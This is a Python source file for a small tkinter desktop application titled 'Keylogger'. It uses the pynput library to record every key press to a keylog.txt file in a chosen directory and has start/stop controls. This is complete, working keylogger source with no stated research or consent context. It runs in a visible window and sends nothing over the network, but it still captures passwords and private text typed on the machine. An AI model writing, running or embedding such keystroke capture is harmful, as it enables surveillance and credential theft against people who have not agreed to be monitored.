import tkinter as tk
from tkinter import filedialog
from pynput.keyboard import Key, Listener
import threading

class KeyloggerGUI:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger")
        self.output_directory = tk.StringVar()
        self.listening = False
        self.listener = None
        self.create_widgets()

    def create_widgets(self):
        bg_color = "#1E1E1E"
        fg_color = "#FFFFFF"
        button_bg_color = "#1E88E5"
        button_fg_color = "#FFFFFF"
        entry_bg_color = "#212121"
        self.master.configure(bg=bg_color)
        tk.Label(self.master, text="Output Directory:", fg=fg_color, bg=bg_color).grid(row=0, column=0, padx=5, pady=5)
        self.output_entry = tk.Entry(self.master, textvariable=self.output_directory, width=40, bg=entry_bg_color, fg=fg_color)
        self.output_entry.grid(row=0, column=1, padx=5, pady=5)
        self.browse_button = tk.Button(self.master, text="Browse", command=self.browse_directory, bg=button_bg_color, fg=button_fg_color)
        self.browse_button.grid(row=0, column=2, padx=5, pady=5)
        self.start_stop_button = tk.Button(self.master, text="Start Listening", command=self.toggle_keylogger, bg=button_bg_color, fg=button_fg_color)
        self.start_stop_button.grid(row=1, column=0, columnspan=3, padx=5, pady=5)
        self.status_label = tk.Label(self.master, text="", anchor="center", fg=fg_color, bg=bg_color)
        self.status_label.grid(row=2, column=0, columnspan=3, padx=5, pady=5)
        
    def browse_directory(self):
        directory = filedialog.askdirectory()
        self.output_directory.set(directory)
        
    def start_keylogger(self):
        output_directory = self.output_directory.get()
        
        def on_press(key):
            try:
                with open(f"{output_directory}/keylog.txt", "a") as f:
                    f.write(str(key) + '\n')
            except Exception as e:
                print(str(e))
                
        def on_release(key):
            if key == Key.esc:
                return False
        
        self.listener = Listener(on_press=on_press, on_release=on_release)
        self.listener.start()
        
    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        
    def toggle_keylogger(self):
        if not self.listening:
            self.listening = True
            self.start_stop_button.config(text="Stop Listening")
            self.status_label.config(text="Now Listening...")
            self.keylogger_thread = threading.Thread(target=self.start_keylogger)
            self.keylogger_thread.start()
        else:
            self.listening = False
            self.start_stop_button.config(text="Start Listening")
            self.status_label.config(text="Not Listening")
            self.stop_keylogger()
            
if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("525x125")
    app = KeyloggerGUI(root)
    root.mainloop()